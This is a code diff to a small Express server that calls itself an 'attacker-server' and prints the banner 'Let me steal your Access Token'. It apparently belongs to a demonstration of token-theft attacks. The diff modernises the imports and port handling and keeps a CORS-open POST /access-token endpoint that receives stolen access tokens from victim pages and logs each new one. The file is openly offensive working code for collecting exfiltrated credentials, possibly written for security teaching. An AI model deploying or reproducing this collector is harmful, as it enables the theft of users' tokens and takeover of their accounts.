@@ -22,35 +22,13 @@
  * SOFTWARE.
  **/
 
-const express = require("express");
-const bodyParser = require("body-parser");
-const cors = require("cors");
+import * as express from 'express';
+import { json } from "body-parser";
+import * as cors from "cors";
 
 const app = express();
-let receivedAccessTokens = [];
-
-app.use(bodyParser.json());
-app.use(cors());
-
-/**
- * Handles post request comes to the path /access-token to print the access token in the console when receives
- */
-app.post("/access-token", cors({ origin: "*" }), (req, res) => {
-
-    if (req.body.accessToken && !receivedAccessTokens.includes(req.body.accessToken)) {
-        console.log("\n")
-        console.log("\x1b[33m%s\x1b[0m", "Caught New Access Token From:", req.body.source || "");
-        console.log("\x1b[32m%s\x1b[0m", req.body.accessToken);
-
-        receivedAccessTokens.push(req.body.accessToken);
-
-        res.status(200).send();
-    }
-
-    res.status(400).send();
-});
-
-app.listen(5000, () => {
+const port = process.env.port || 5000;
+const server = app.listen(port, () => {
     console.log(
         "   _                _                 \n" +
         "  | |              | |                \n" +
@@ -62,5 +40,31 @@ app.listen(5000, () => {
     console.log("----------------------------------");
     console.log("  Let me steal your Access Token  ");
     console.log("----------------------------------\n");
-    console.log("Server running at port 5000.\n");
+    console.log(`Listening at http://localhost:${port}/access-token`);
 });
+
+let receivedAccessTokens = [];
+
+app.use(json());
+app.use(cors());
+
+app.get('/access-token', cors({ origin: "*" }), (req, res) => {
+    res.send({ message: 'Welcome to attacker-server!' });
+});
+
+app.post('/access-token', cors({ origin: "*" }), (req, res) => {
+
+    if (req.body.accessToken && !receivedAccessTokens.includes(req.body.accessToken)) {
+        console.log("\n")
+        console.log("\x1b[33m%s\x1b[0m", "Found New Access Token From:", req.body.source || "");
+        console.log("\x1b[32m%s\x1b[0m", req.body.accessToken);
+
+        receivedAccessTokens.push(req.body.accessToken);
+
+        res.status(200).send();
+    }
+
+    res.status(400).send();
+});
+
+server.on('error', console.error);
